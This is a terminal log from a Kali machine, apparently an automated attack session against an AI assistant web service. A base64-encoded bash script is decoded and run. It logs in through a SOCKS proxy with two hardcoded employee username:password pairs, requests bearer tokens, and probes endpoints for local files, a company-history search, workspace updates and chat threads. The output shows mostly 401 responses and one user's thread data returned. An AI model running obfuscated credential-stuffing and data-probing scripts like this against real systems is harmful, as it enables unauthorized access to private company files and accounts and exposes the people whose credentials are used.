@@ -1,0 +1,43 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/w01cm.sh <<'B64EOF'
+> IyEvYmluL2Jhc2gKUD0iLS1zb2NrczUtaG9zdG5hbWUgMTI3LjAuMC4xOjEwODAiCkE9aHR0cHM6Ly9hc3Npc3RhbnQua2VwbGVyb3BzLnRlc3QKZm9yIFUgaW4gInJvd2FuLml0bzpma19kZXZlbG9wZXJfeVVXVEtTcXJjMTZ5M0s1XzVEZlE3cWFjZnQ5Yi05eG8iICJtYXlhLnJhbnNjb21iZTpzV1FhMzEwODVGVFFla1poSFR4VXlmXzlFMW1hcnEwdXI4V05DS21UdG5rIjsgZG8KIHVuPSR7VSUlOip9OyBwdz0ke1UjKjp9CiBUT0s9JChjdXJsIC1zUyAkUCAtLWNhY2VydCAvdG1wL2NhLmNydCAtLW1heC10aW1lIDE1IC1YIFBPU1QgLUggJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicgLWQgIntcInVzZXJuYW1lXCI6XCIkdW5cIixcInBhc3N3b3JkXCI6XCIkcHdcIn0iICIkQS9hcGkvcmVxdWVzdC10b2tlbiIgfCBweXRob24zIC1jICdpbXBvcnQganNvbixzeXM7cHJpbnQoanNvbi5sb2FkKHN5cy5zdGRpbikuZ2V0KCJ0b2tlbiIsIiIpKScpCiBlY2hvICIjIyMjIyAkdW4iCiBIPSJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFRPSyIKIGZvciBwIGluICIvYXBpL3N5c3RlbS9sb2NhbC1maWxlcz9saW1pdD0yMCIgIi9hcGkvc3lzdGVtL2xvY2FsLWZpbGVzL3NlYXJjaD9xPWNvbXBhbnktaGlzdG9yeSIgIi9hcGkvd29ya3NwYWNlL2ZpZWxkbGluay1vcGVyYXRpb25zL3VwZGF0ZSIgIi9hcGkvd29ya3NwYWNlL2ZpZWxkbGluay1vcGVyYXRpb25zL3RocmVhZHMiOyBkbwogIGVjaG8gIi0tICRwIgogIGlmIFsgIiRwIiA9ICIvYXBpL3dvcmtzcGFjZS9maWVsZGxpbmstb3BlcmF0aW9ucy91cGRhdGUiIF07IHRoZW4KICAgIGN1cmwgLXNTICRQIC0tY2FjZXJ0IC90bXAvY2EuY3J0IC0tbWF4LXRpbWUgMTUgLUggIiRIIiAtSCAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJyAtWCBQT1NUIC1kICd7ImNoYXRNb2RlIjoicXVlcnkifScgIiRBJHAiIC13ICdcbmNvZGU9JXtodHRwX2NvZGV9XG4nIHwgaGVhZCAtYyA2MDAKICBlbHNlCiAgICBjdXJsIC1zUyAkUCAtLWNhY2VydCAvdG1wL2NhLmNydCAtLW1heC10aW1lIDE1IC1IICIkSCIgIiRBJHAiIC13ICdcbmNvZGU9JXtodHRwX2NvZGV9XG4nIHwgaGVhZCAtYyA4MDAKICBmaQogIGVjaG8KIGRvbmUKZG9uZQo=
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/w01cm.sh; bash /tmp/w01cm.sh; echo DONEMARK_1795206101920$((6*7))
+##### rowan.ito
+-- /api/system/local-files?limit=20
+Unauthorized
+code=401
+
+-- /api/system/local-files/search?q=company-history
+Unauthorized
+code=401
+
+-- /api/workspace/fieldlink-operations/update
+Unauthorized
+code=401
+
+-- /api/workspace/fieldlink-operations/threads
+{"threads":[{"id":8,"name":"Thread","slug":"2c4bd344-fd6f-47a0-bfab-77cb958eb9b1","workspace_id":1,"user_id":2,"createdAt":"2026-11-20T18:42:08.652Z","lastUpdatedAt":"2026-11-20T18:42:08.652Z"},{"id":10,"name":"Thread","slug":"d3a27ac0-9118-40a2-b1cb-6df529e035c3","workspace_id":1,"user_id":2,"createdAt":"2026-11-20T20:06:27.942Z","lastUpdatedAt":"2026-11-20T20:06:27.942Z"}],"defaultThreadChatCount":0}
+code=200
+
+##### maya.ranscombe
+-- /api/system/local-files?limit=20
+Unauthorized
+code=401
+
+-- /api/system/local-files/search?q=company-history
+Unauthorized
+code=401
+
+-- /api/workspace/fieldlink-operations/update
+Unauthorized
+code=401
+
+-- /api/workspace/fieldlink-operations/threads
+{"threads":[],"defaultThreadChatCount":0}
+code=200
+
